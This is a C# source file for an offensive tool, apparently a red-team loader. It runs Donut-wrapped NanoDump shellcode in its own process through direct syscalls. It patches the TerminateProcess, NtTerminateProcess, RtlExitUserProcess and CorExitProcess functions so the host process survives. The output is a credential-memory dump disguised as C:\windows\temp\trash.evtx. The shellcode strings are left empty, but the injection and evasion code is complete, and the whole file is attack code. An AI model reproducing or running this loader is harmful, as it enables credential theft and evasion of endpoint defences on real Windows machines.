namespace sNanoDumpInject
{
    public class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentProcess();

        // All credits to @CCob's sharpblock - https://github.com/CCob/SharpBlock/blob/master/Program.cs#L37
        static D GetDelegateForSyscall<D>(IntPtr syscallStub) where D : Delegate
        {
            return (D)Marshal.GetDelegateForFunctionPointer(syscallStub, typeof(D));
        }

        // Exitpatcher function stolen from From Nettitudes RunPE -> https://github.com/nettitude/RunPE 
        internal const uint PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernel32.dll")]
        internal static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpFlOldProtect);

        internal static byte[] PatchFunction(string dllName, string funcName, byte[] patchBytes)
        {

            var moduleHandle = GetModuleHandle(dllName);
            var pFunc = GetProcAddress(moduleHandle, funcName);

            var originalBytes = new byte[patchBytes.Length];
            Marshal.Copy(pFunc, originalBytes, 0, patchBytes.Length);


            var result = VirtualProtect(pFunc, (UIntPtr)patchBytes.Length, PAGE_EXECUTE_READWRITE, out var oldProtect);
            if (!result)
            {

                return null;
            }

            Marshal.Copy(patchBytes, 0, pFunc, patchBytes.Length);


            result = VirtualProtect(pFunc, (UIntPtr)patchBytes.Length, oldProtect, out _);
            if (!result)
            {
            }

            return originalBytes;
        }

        private byte[] _terminateProcessOriginalBytes;
        private byte[] _ntTerminateProcessOriginalBytes;
        private byte[] _rtlExitUserProcessOriginalBytes;
        private byte[] _corExitProcessOriginalBytes;

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        internal static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        internal static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(Data.Win32.Kernel32.ProcessAccessFlags processAccess, bool bInheritHandle, int processId);

        internal bool PatchExit()
        {
            var hKernelbase = GetModuleHandle("kernelbase");
            var pExitThreadFunc = GetProcAddress(hKernelbase, "ExitThread");

            var exitThreadPatchBytes = new List<byte>() { 0x48, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8 };
            /*
                mov rcx, 0x0 #takes first arg
                mov rax, <ExitThread> # 
                push rax
                ret
             */
            var pointerBytes = BitConverter.GetBytes(pExitThreadFunc.ToInt64());

            exitThreadPatchBytes.AddRange(pointerBytes);

            exitThreadPatchBytes.Add(0x50);
            exitThreadPatchBytes.Add(0xC3);

            _terminateProcessOriginalBytes =
                PatchFunction("kernelbase", "TerminateProcess", exitThreadPatchBytes.ToArray());
            if (_terminateProcessOriginalBytes == null)
            {
                return false;
            }
            _corExitProcessOriginalBytes =
                PatchFunction("mscoree", "CorExitProcess", exitThreadPatchBytes.ToArray());
            if (_corExitProcessOriginalBytes == null)
            {
                return false;
            }

            _ntTerminateProcessOriginalBytes =
                PatchFunction("ntdll", "NtTerminateProcess", exitThreadPatchBytes.ToArray());
            if (_ntTerminateProcessOriginalBytes == null)
            {
                return false;
            }


            _rtlExitUserProcessOriginalBytes =
                PatchFunction("ntdll", "RtlExitUserProcess", exitThreadPatchBytes.ToArray());
            if (_rtlExitUserProcessOriginalBytes == null)
            {
                return false;
            }

            return true;
        }

        internal void ResetExitFunctions()
        {

            PatchFunction("kernelbase", "TerminateProcess", _terminateProcessOriginalBytes);

            PatchFunction("mscoree", "CorExitProcess", _corExitProcessOriginalBytes);

            PatchFunction("ntdll", "NtTerminateProcess", _ntTerminateProcessOriginalBytes);

            PatchFunction("ntdll", "RtlExitUserProcess", _rtlExitUserProcessOriginalBytes);

        }

        public static void Inject(int arg)
        {
            // donut + nanodump updated - 6/12/2022 
            string base64nano = "";
            // The latest donut release from @theWhover fails for generating nanodump shellcode. Therefore you need to use the following branch: https://github.com/S4ntiagoP/donut/tree/syscalls
            if (arg == 1)
            {
                // NanoDump Donut shellcode generated via 'donut -i nanodump.x64.exe -b=1 -t -p "--write C:\windows\temp\trash.evtx" -o nano.bin' + base64 encoded
                base64nano = "";    
            }

            if (arg == 2)
            {
                // NanoDump Donut shellcode generated via 'donut -i nanodump.x64.exe -b=1 -t -p "--valid --write C:\windows\temp\trash.evtx" -o nano.bin' + base64 encoded
                base64nano = "";   
            }

            /*
             * Syscall edits 
             */

            // Getting the Nanodump donut'ed shellcode 
            byte[] buf1 = Convert.FromBase64String(base64nano);
            IntPtr pointer = Marshal.AllocHGlobal(buf1.Length);
            Marshal.Copy(buf1, 0, pointer, buf1.Length);

            // NtOpenProcess 
            IntPtr hProc = IntPtr.Zero;
            Data.Native.OBJECT_ATTRIBUTES oa = new Data.Native.OBJECT_ATTRIBUTES();
            Data.Native.CLIENT_ID ci = new Data.Native.CLIENT_ID();
            ci.UniqueProcess = new IntPtr(Process.GetCurrentProcess().Id);
            ci.UniqueThread = IntPtr.Zero;

            var NtOpenProcess = GetDelegateForSyscall<Native.Delegates.NtOpenProcess>(DSyscall.GetSyscallStub("NtOpenProcess"));
            NtOpenProcess(
                ref hProc,
                (uint)Data.Win32.Kernel32.ProcessAccessFlags.All,
                ref oa,
                ref ci
                );

            // NtAllocateVirtualMemory 
            IntPtr baseAddress = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)buf1.Length;

            var NtAllocateVirtualMemory = GetDelegateForSyscall<Native.Delegates.NtAllocateVirtualMemory>(DSyscall.GetSyscallStub("NtAllocateVirtualMemory"));
            NtAllocateVirtualMemory(
                hProc,
                ref baseAddress,
                IntPtr.Zero,
                ref regionSize,
                Data.Win32.Kernel32.MEM_COMMIT | Data.Win32.Kernel32.MEM_RESERVE,
                Data.Win32.WinNT.PAGE_READWRITE
                );

            // NtWriteVirtualMemory 
            uint bytesWritten = 0;

            var NtWriteVirtualMemory = GetDelegateForSyscall<Native.Delegates.NtWriteVirtualMemory>(DSyscall.GetSyscallStub("NtWriteVirtualMemory"));
            NtWriteVirtualMemory(
                hProc,
                baseAddress,
                pointer,
                (uint)buf1.Length,
                ref bytesWritten
                );

            // NtProtectVirtualMemory 
            uint old = 0;
            regionSize = (IntPtr)buf1.Length;

            var NtProtectVirtualMemory = GetDelegateForSyscall<Native.Delegates.NtProtectVirtualMemory>(DSyscall.GetSyscallStub("NtProtectVirtualMemory"));
            NtProtectVirtualMemory(
                hProc,
                ref baseAddress,
                ref regionSize,
                (uint)Data.Win32.WinNT.PAGE_EXECUTE_READ,
                ref old
                );

            var mc = new Program();

            bool patched = mc.PatchExit();
            Console.WriteLine("\r\n[+] Exit functions patched: " + patched + "\r\n");
            Console.WriteLine(@"[+] Dumping the thing to: C:\windows\temp\trash.evtx");
            Console.WriteLine("\r\n=========================");

            // NtCreateThreadEx 
            IntPtr hThread = new IntPtr(0);

            var NtCreateThreadEx = GetDelegateForSyscall<Native.Delegates.NtCreateThreadEx>(DSyscall.GetSyscallStub("NtCreateThreadEx"));
            NtCreateThreadEx(
                out hThread,
                Data.Win32.WinNT.ACCESS_MASK.SPECIFIC_RIGHTS_ALL | Data.Win32.WinNT.ACCESS_MASK.STANDARD_RIGHTS_ALL,
                IntPtr.Zero,
                hProc,
                baseAddress,
                IntPtr.Zero,
                false,
                0,
                0,
                0,
                IntPtr.Zero
                );

            // NtWaitForSingleObject
            var NtWaitForSingleObject = GetDelegateForSyscall<Native.Delegates.NtWaitForSingleObject>(DSyscall.GetSyscallStub("NtWaitForSingleObject"));
            NtWaitForSingleObject(
                hThread,
                true,
                IntPtr.Zero
                );

            Console.WriteLine("=========================");
            Console.WriteLine("\r\n[+] Thread done");

            mc.ResetExitFunctions();

            if (File.Exists(@"C:\windows\temp\trash.evtx"))
            {
                Console.WriteLine("\r\nDumpfile successfully created!\r\n");
            }

            Console.WriteLine("[!] If you run this again, the current process will crash. Open up another shell/beacon if you want to run again.\r\n");
        }
    }
}
